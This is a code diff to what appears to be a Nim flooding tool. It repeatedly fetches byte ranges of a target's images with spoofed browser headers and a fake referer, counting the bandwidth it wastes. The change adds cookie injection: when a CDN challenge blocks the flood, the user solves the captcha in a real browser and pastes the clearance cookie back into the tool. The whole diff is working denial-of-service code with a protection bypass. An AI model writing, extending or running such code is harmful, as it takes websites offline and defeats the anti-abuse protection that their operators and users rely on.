@@ -19,7 +19,7 @@ proc inFight(target: string, userAgent: string): void =
 proc inFightP(target: string, filePth: string, call: string): void =
   discard os.execShellCmd(call & " " & filePth & " -private -url " & target)
 
-proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, timeout = 1200, log = false): bool =
+proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, cookieInject:string, timeout = 1200, log = false): bool =
   let client = newHttpClient(timeout = timeout)
 
   client.headers = newHttpHeaders({
@@ -33,6 +33,7 @@ proc imgGrb(conType: string, target: string, targetImg: string, userAgent: strin
     "Sec-Fetch-Dest": "image",
     "Sec-Fetch-Mode": "no-cors",
     "Sec-Fetch-Site": "same-origin",
+    "cookie": cookieInject,
     "Priority": "u=5, i",
     "Pragma": "no-cache",
     "Cache-Control": "no-cache",
@@ -83,22 +84,27 @@ var
   userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
   conType = "https://"
   call = "start"
+  cookieInject = ""
   filePth = "C:/\"Program Files (x86)/Mozilla Firefox\"/firefox.exe" #in winDUSE lol
 
 while true:
   discard spawn sessionGrb(target, port, range, log = true)
-  var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/")
+  var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/", cookieInject)
   if ^outPass == true:
     bitWast += bitRange
     echo "Send keep-alive packet to -> " & target & "[" & targetImg & "," & intToStr(bitWast) & "]"
   else:
     if imInFight == false:
-      echo "maybe its blocked by cdn or etc. try solve captcha, js,... by yourself (r for real browser / warn: use custom/rand fingerprint for browser)? [r/y/n]"
-      let userInput = stdin.readLine()
+      echo "Maybe its blocked by cdn or etc. try solve captcha, js,... by yourself (r for real browser / warn: use custom/rand fingerprint for browser)? [r/y/n]"
+      var userInput = stdin.readLine()
       if userInput == "y":
         spawn inFight(conType & target, userAgent)
+        # soon
       if userInput == "r":
         spawn inFightP(conType & target, filePth, call)
+        echo "Give me your cookie header (like cf_chl_rc_m=2, xf_session=blahblah)"
+        userInput = stdin.readLine()
+        cookieInject = userInput
       elif userInput == "n":
         discard
 ]#
